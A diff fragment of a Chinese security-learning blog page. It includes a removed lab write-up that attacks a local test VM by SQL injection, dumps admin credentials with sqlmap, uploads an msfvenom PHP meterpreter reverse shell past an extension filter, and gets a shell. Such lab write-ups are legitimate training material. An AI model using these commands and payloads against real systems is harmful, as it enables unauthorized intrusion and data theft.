alt=""><br>&emsp;&emsp;发现Summer用户无法执行root权限的命令。<br>&emsp;&emsp;此次渗透到此为止。<br><strong>0x04总结</strong><br>&emsp;&emsp;靶机不同于之前做的针对于当个漏洞知识点的靶场，更能让人体会到以信息收集过程开始的渗透流程。靶机难度不高，基本上是考验细心程度以及对搜集到的信息的敏感程度，Flag的位置比较容易发现，适合新手。<br>&emsp;&emsp;此次玩耍虽没用上什么厉害的姿势与方法，但就着这篇文章横向进行学习，不懂的名词或者命令等百度检索之后，还是能够学到一些知识点，点点滴滴下去，还是能有所收获的。</p>
 <p>———-分割线———-</p>
 <h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶机有两种(.ova/.vmdk)<br>&emsp;&emsp;对于.ova文件，在虚拟机软件中直接打开/导入就好.<br>&emsp;&emsp;对于.vmdk文件，则需要在虚拟机软件中创建虚拟机，然后在创建硬盘的时候选择“使用现有硬盘”导入.vmdk文件就好。(具体可去搜索引擎中了解，搜索引擎是最好的老师。)<br>kali以及靶机的网络连接模式都需要选择<strong>桥接网卡</strong>模式。<br>当靶机启动后，在kali的终端中输入<code>ifconfig</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8728.png" alt=""><br>子网掩码3个255表示24位<br>然后输入命令<code>netdiscover -r ip(kali)/24</code>，探测靶机的ip地址<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/%E5%89%8D%E7%BD%AE%E7%AF%87/%E5%9B%BE%E7%89%8729.png" alt=""><br>即可获得靶场的ip地址</p>
 <p><br><br><br><br><font face="Georgia" color=#c4444>不断学习，不断积累。</font><br>作者：WebDogC</p>
@@ -818,91 +895,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2020/04/27/GetFlag-POST-SQL%E6%B3%A8%E5%85%A5/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-GetFlag-GET-SQL注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/25/GetFlag-GET-SQL%E6%B3%A8%E5%85%A5/">GetFlag-GET-SQL注入</a>
-    </h1>
-  
-
-        
-        <a href="/2020/04/25/GetFlag-GET-SQL%E6%B3%A8%E5%85%A5/" class="archive-article-date">
-  	<time datetime="2020-04-24T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-25</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><strong>0x00前言</strong><br>&emsp;&emsp;本文是第一篇，重点记录靶机80端口GET-SQL注入的渗透过程，涉及知识点：工具sqlmap、nikto及nmap的使用、文件上传、msf生成后门等。关于靶场，玩法不一，以下只是本人的一次学习过程，不喜勿喷。ps：靶场可能没有设置Flag值，也可能是由于本人水平有限，无法提权到root找到flag。<br><strong>0x01环境</strong><br>&emsp;&emsp;攻击机(kali)：192.168.1.107<br>&emsp;&emsp;靶机(Debian)：192.168.1.103<br><strong>0x02工具</strong><br>&emsp;&emsp;nmap、nikto、sqlmap、metasploit、VMware<br><strong>0x03过程</strong><br>&emsp;&emsp;<strong>信息探测</strong><br>&emsp;&emsp;终端下输入<code>nmap -T4 -A -p- 192.168.1.103</code><br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%871.png" alt=""><br>&emsp;&emsp;探测结果为<br>&emsp;&emsp;&emsp;&emsp;开放端口：22(ssh) &amp; 80(http)<br>&emsp;&emsp;&emsp;&emsp;Web容器信息：Apache httpd 2.2.16<br>&emsp;&emsp;&emsp;&emsp;系统信息：Debian<br>&emsp;&emsp;进一步使用nikto探测敏感信息<br>&emsp;&emsp;终端下输入<code>nikto -host http://192.168.1.103</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%872.png" alt=""><br>&emsp;&emsp;获取到php版本信息，以及<code>/admin/login.php</code>后台登录页面<br>&emsp;&emsp;<strong>深入挖掘</strong><br>&emsp;&emsp;使用浏览器访问靶机ip<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%873.png" alt=""><br>&emsp;&emsp;打开登录页面<code>ip/admin/login.php</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%874.png" alt=""><br>&emsp;&emsp;尝试弱口令，无果。这时可以使用Burpsuite结合字典进行暴力破解，这里不做演示。<br>&emsp;&emsp;对网站进行浏览，发现id型展示页面，输入单引号，页面报错。<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%875.png" alt=""><br>&emsp;&emsp;进一步使用payload<code>and 1=1</code> 与<code>and 1=2</code>，确认存在注入。<br>&emsp;&emsp;拿出SQLmap，简单复习一下SQLmap命令</p>
-<blockquote>
-<p><code>sqlmap -u url -current-db</code>获取当前数据库名<br><code>sqlamp -u url -D &quot;数据库名&quot; --tables</code> 获取指定数据库中的所有表名<br><code>sqlamp -u url -D &quot;数据库名&quot; -T “表名” --columns</code> 获取指定表中的所有字段名<br><code>sqlamp -u url -D &quot;数据库名&quot; -T “表名” -C &quot;字段名&quot; --dump</code> 获取指定表的数据</p>
-</blockquote>
-<p>&emsp;&emsp;通过上述命令，可以得到当前数据库photoblog表users中的字段值admin，P4ssw0rd<br>&emsp;&emsp;<strong>漏洞利用</strong><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%876.png" alt=""><br>&emsp;&emsp;成功登录之后在后台首页中，<code>Add a new picture</code>是文件上传点，利用msfvenom制作木马文件<br><code>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.107 LPORT=4444 
--f raw &gt;./Desktop/shell.php</code><br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%877.png" alt=""><br>&emsp;&emsp;成功在桌面生成木马文件。</p>
-<blockquote>
-<p>在文件上传中，一般都会存在一些对上传文件的严格限制，需要根据实际情况来想办法进行绕过，然而在大多数情况下，后台管理页面的限制比较简单。在这里将上传文件后缀名改为大写即(PHP)，即可成功上传。</p>
-</blockquote>
-<p>&emsp;&emsp;为上传文件添加一个标题<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%878.png" alt=""><br>&emsp;&emsp;打开msfconsole控制台对文件进行监听<br><img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%879.png" alt=""><br>&emsp;&emsp;开始监听，回到网页打开木马文件<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8710.png" alt=""><br>&emsp;&emsp;成功返回，输入shell，弹出命令行<br>&emsp;&emsp;<img src="https://img-1301411730.cos.ap-chengdu.myqcloud.com/myblog/CTF/GET-SQL%E6%B3%A8%E5%85%A5/%E5%9B%BE%E7%89%8711.png" alt=""><br>&emsp;&emsp;简单输入命令，发现当前用户为普通用户权限，接着需要进行提权操作，由于水平有，无法展开。</p>
-<p>—————————-分割线—————————-<br><strong>0x04总结</strong><br>&emsp;&emsp;此次渗透首先对目标站点进行信息收集，分析信息过程中发现SQL注入获取到后台登录密码，成功登录后台后发现文件上传点，接着制作木马文件并上传，然后使用msf控制台监听文件，当文件被执行时，成功返回网站shell。<br>&emsp;&emsp;过程并不复杂，只是可以让自己对所学的知识进行简单的应用与梳理，脱离单一的靶场，初步了解渗透过程，并进一步熟悉自己掌握的知识点与技能。</p>
-<p><br><br><br><br><font face="Georgia" color=#c4444>复现而知新。</font><br>作者：WebDogC</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">复现、CTF、study、SQL、GET</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2020/04/25/GetFlag-GET-SQL%E6%B3%A8%E5%85%A5/">展开全文 >></a>
         </p>
       
 
